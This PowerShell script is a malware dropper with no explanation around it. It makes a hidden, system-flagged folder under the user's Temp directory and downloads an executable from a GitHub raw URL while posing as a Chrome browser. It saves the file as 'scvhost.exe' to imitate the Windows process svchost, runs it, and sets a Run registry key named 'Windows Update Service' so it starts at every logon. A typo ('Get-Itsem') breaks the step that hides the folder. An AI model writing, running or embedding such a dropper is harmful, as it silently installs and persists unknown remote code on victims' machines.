
$randomName = "1182247348.tmp.dir"


$temp = Join-Path "$env:USERPROFILE\AppData\Local\Temp" $randomName

if (-not (Test-Path $temp)) {
    New-Item -ItemType Directory -Path $temp | Out-Null
    $item = Get-Itsem $temp
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
}


$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JerryyyTheClone/test/refs/heads/main/winwg.exe" -OutFile (Join-Path $temp "scvhost.exe") -Headers $headers -Verbose


Start-Process -FilePath (Join-Path $temp scvhost.exe) -NoNewWindow


$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "Windows Update Service"
$regValue = (Join-Path $temp scvhost.exe)
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force